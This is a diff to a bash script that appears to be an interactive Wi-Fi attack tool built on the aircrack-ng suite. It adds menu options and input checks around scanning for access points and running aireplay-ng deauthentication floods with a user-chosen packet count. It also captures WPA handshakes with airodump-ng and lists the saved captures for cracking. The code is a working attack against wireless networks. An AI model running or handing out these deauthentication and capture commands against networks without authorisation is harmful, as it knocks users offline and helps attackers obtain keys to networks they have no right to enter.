@@ -135,48 +135,82 @@ scan_net () {
     # Print net list
     cat ${tmpDir}/menu1
     
-    echo -n "
-    Input selected network id : "
-    read apnum
+    prompt_net() {
+        echo -n $'\n' "Input selected network id [R to rescan]: "
+        read apnum
+        if [ -z ${apnum} ]; then
+            echo -e "\e[1;31mYou must input a number.\e[0m"
+            prompt_net
+            elif [ ${apnum} == "R" ] || [ ${apnum} == "r" ]; then
+            mode=1 && main_menu false # back to main menu, directly in the scan option
+            elif [ ! -z "${apnum##[0-9]*}" ] || (( ${apnum} < 0 )); then
+            echo -e "\e[1;31mNetwork id must be a number.\e[0m"
+            prompt_net
+        fi
+    }
+    prompt_net
     
     apline=$(cat ${tmpDir}/menu1 | grep "${apnum})")
     apmac=$(echo ${apline} | grep -oE "([0-9a-fA-F]{2}:?){6}")
     apchannel=$(echo ${apline} | cut -d"," -f3 | grep -o "[1-9]*" )
     apname=$(echo ${apline} | cut -d")" -f2 | cut -d"," -f1 | xargs)
     
-    echo "Selected network ${apname} with mac address ${apmac} on channel ${apchannel}"
+    echo -e "
+    Selected network \e[1;34m${apname}\e[0m with mac address \e[1;34m${apmac}\e[0m on channel \e[1;34m${apchannel}\e[0m."
     attack_mode_menu
 }
 
 attack_mode_menu() {
     if [ -v $1 ]
     then echo -e "
+
+\e[1;34mR)\e[0m Re-scan
 \e[1;34m1)\e[0m Capture handshakes
 \e[1;34m2)\e[0m Deauthentify this network
 \e[1;34m3)\e[0m Capture handshakes & Deauthentify this network
+\e[1;34mB)\e[0m Back to main menu
         \e[1;34mX)\e[0m Exit script"
     fi
     
-    echo -ne "\e[1mChoice :\e[0m "
+    echo -ne $'\n' "\e[1mChoice :\e[0m "
     
     read attackmode
     case ${attackmode} in
+        R|r) mode=1 && main_menu false
+        ;;
         1) capsave="${capdir}/${apmac}/"
             mkdir -p ${capsave}
             rm -f ${capsave}/*
             airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
             main_menu
         ;;
-        2) iwconfig ${imon} channel ${apchannel}
-            aireplay-ng -0 0 -a ${apmac} ${imon}
+        2) echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
+            read deauthnbr
+            if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || (( ${deauthnbr} < 0 )) 2>/dev/null; then
+                echo -e "\e[1;31mInvalid choice, using 10.\e[0m"
+                deauthnbr=10
+            fi
+            iwconfig ${imon} channel ${apchannel}
+            aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}
+            attack_mode_menu
         ;;
-        3) echo "NOTE: To stop deauth, simply Ctrl+C in the popup terminal window."
+        3)clear -x
+            echo -e "\e[1;31mNOTE:\e[0m \e[3mTo stop deauth, simply Ctrl+C in the popup terminal window.\e[0m"
+            echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
+            read deauthnbr
+            if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || (( ${deauthnbr} < 0 )) 2>/dev/null; then
+                echo -e "\e[1;31mInvalid choice, using 10.\e[0m"
+                deauthnbr=10
+            fi
             capsave="${capdir}/${apmac}"
             mkdir -p ${capsave}
             rm -f ${capsave}/*
             iwconfig ${imon} channel ${apchannel}
+            gnome-terminal --tab -- sh -c "aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}"
             airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
-            gnome-terminal -- "aireplay-ng -0 30 -a ${apmac} ${imon} && sh"
+            attack_mode_menu
+        ;;
+        B|b) main_menu
         ;;
         X|x) echo "Bye !" && exit 1
         ;;
@@ -189,9 +223,9 @@ attack_mode_menu() {
 crack_menu (){
     list=""
     i=0
-    for dir in ${capdir}/*/; do
-        dir=${dir%*/}
-        list+="\e[1;34m${i})\e[0m ${dir##*/}"
+    capdirlist=$(ls -t ${capdir} | tr ' ' '\n')
+    for dir in ${capdirlist}; do
+        list+="\e[1;34m${i})\e[0m ${dir}"
         [[ $i -eq 0 ]] && list+="         \e[3;34mrecent\e[0m"
         list+=$'\n'
         ((++i))
